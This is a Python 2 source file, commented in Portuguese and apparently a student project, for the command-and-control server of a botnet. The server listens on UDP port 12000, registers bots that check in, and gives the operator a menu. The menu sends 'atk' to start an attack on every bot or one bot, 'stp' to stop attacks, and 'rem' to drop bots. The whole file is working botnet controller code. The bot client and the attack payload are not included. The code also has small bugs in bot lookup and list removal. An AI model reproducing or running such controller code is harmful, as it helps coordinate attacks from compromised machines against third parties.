"""
Para lidar com problemas de portas em uso:

Digite na linha de comando:
	$ netstat -ano|findstr 12000
# 12000 -> numero da porta que utilizamos #

vc tera algo assim:
	TCP    0.0.0.0:12000     IP_DO_HOST:PORTA_DO_HOST     19088
# 19088 -> PID do processo malvado #

Mate o processo malvado
	tskill 19088
"""
import threading
import errno
from socket import *
serverPort = 12000
serverSocket = socket(AF_INET, SOCK_DGRAM)
serverSocket.bind(('', serverPort))

print 'O servidor ' + gethostname() + ' esta pronto'
print 'Para abrir o menu aperte ENTER'

bots = []

def ImprimeBots():
    for i in range(len(bots)):
        try:#                      Nome                             IP                                      Porta
            print str(i) + ' - ' + bots[i][0] + "  |  IP: " + str(bots[i][1][0]) + "  |  Porta: " + str(bots[i][1][1])
        except error, e:
            print 'IP do bot nao encontrado\n'

def FindByName(name):
    for i in range(len(bots)):
        if name == bots[i][0]:
            break

    if i == len(bots) and name != bots[i][0]:
        return -1

    return i

def EnviaMensagem(index, msg):
    try:
        serverSocket.sendto(msg, bots[index][1])
        #atk - ataque | rem - remover da botnet | stp - parar ataque
        return 0
    except error, e:
        if e[0] == errno.ECONNREFUSED:
            print 'Conexao perdida com o bot ' + bots[index][0] + ' - Removendo-o da botnet'
        if e[0] == errno.ETIMEDOUT:
            print 'O bot ' + bots[index][0] + ' esta demorando muito para responder'
        return -1

def ThreadEnvio():
    while True:
        try:
            raw_input()
        except EOFError:
            for i in range(len(bots)):
                EnviaMensagem(i, 'rem')
            print 'Removento todos os bots\n'
            del bots[:]
            exit(0)

        if len(bots) == 0:
            print 'Nao ha bots conectados'

        else:
            print 'O que deseja fazer?'
            print '1 - Ver lista de bots conectados'
            print '2 - Fazer todos os bots enviarem ataque'
            print '3 - Fazer um bot especifico enviar ataque'
            print '4 - Parar todos os ataques'
            print '5 - Remover um bot da botnet'
            print '6 - Remover todos os bots da botnet'
            op = input ('0 - Sair\n')
            
            if op == 1:
                print '\nbotnet:'
                ImprimeBots()
                
            elif op == 2:
                for i in range(len(bots)):
                    if EnviaMensagem(i, 'atk') == 0:
                        print 'Bot ' + bots[i][0]  + ' iniciou o ataque\n'
                    else:
                        print 'Bot desconectado ' + bots[i][0] + ', removendo-o da botnet'
                        bots.remove(bots[i])
                        i = i - 1
                    
            elif op == 3:
                print '\nQual bot deseja que inicie o ataque:'
                ImprimeBots()
                bot = input('')
                if EnviaMensagem(bot, 'atk') == 0:
                    print 'Bot ' + bots[bot][0] + ' iniciou o ataque\n'
                else:
                   print 'Bot desconectado ' + bots[bot][0] + ', removendo-o da botnet'
                   bots.pop(bot)

            elif op == 4:
                print 'Parando todos os ataques'
                for i in range(len(bots)):
                    if EnviaMensagem(i, 'stp') == 0:
                        print 'Bot ' + bots[i][0]  + ' parou o ataque\n'
                    else:
                        print 'Bot desconectado ' + bots[i][0] + ', removendo-o da botnet'
                        bots.remove(bots[i])
                        i = i - 1

            elif op == 5:
                print '\nQual bot deseja remover da botnet:'
                ImprimeBots()
                bot = input('')
                EnviaMensagem(bot, 'rem')
                print 'Removendo bot: ' + bots[bot][0] + '\n'
                bots.remove(bots[bot])

            elif op == 6:
                for i in range(len(bots)):
                    EnviaMensagem(i, 'rem')
                print 'Removento todos os bots\n'
                del bots[:]

            elif op == 0:
                for i in range(len(bots)):
                    EnviaMensagem(i, 'rem')
                print 'Removento todos os bots\n'
                del bots[:]
                exit(0)

try:              
    thread = threading.Thread(target = ThreadEnvio, args=())
    thread.start()

    while True:
        message, clientAddress = serverSocket.recvfrom(2048)
        #print message

        tipo = message[:3] #3 primeiros caracteres da string definem o tipo da mensagem
        #cli = novo cliente | off = cliente desconectado
        message = message[3:]


        if tipo == 'cli' :
            if (message in bots) == False:
                bots.append((message, clientAddress, False))
                print '\n' + message + ' conectado a botnet\n'
                serverSocket.sendto('acc', clientAddress)

        if tipo == 'off' :
            bot = FindByName(message)
            if bot  != -1:
                bots.pop(bot)
                print '\n' + message +  ' desconectado da botnet\n'
        #serverSocket.sendto(modifiedMessage, clientAddress)
except SystemExit:
    for i in range(len(bots)):
        EnviaMensagem(i, 'rem')
    print 'Removento todos os bots\n'
    del bots[:]
    exit(0)